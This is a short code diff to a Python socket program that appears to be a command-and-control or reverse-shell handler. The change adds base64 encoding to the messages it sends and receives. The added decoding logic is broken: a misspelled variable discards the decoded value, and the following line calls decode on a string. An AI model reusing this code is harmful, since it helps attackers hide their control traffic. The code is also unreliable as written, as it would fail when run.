@@ -5,6 +5,7 @@ import sys
 import ctypes
 import platform
 import time
+import base64
 
 def inbound():
     print("[+] Awaiting response...")
@@ -13,13 +14,16 @@ def inbound():
     while True:
         try:
             message = sock.recv(1024).decode()
-            return message
+            mesage = base64.b64decode(message)
+            message = message.decode().strip()
+            return (message)
 
         except Exception:
             sock.close()
 
 def outbound(message):
-    response = str(message).encode()
+    response = str(message)
+    response = base64.b64encode(bytes(response, encoding="utf8"))
     sock.send(response)
 
 def session_handler():
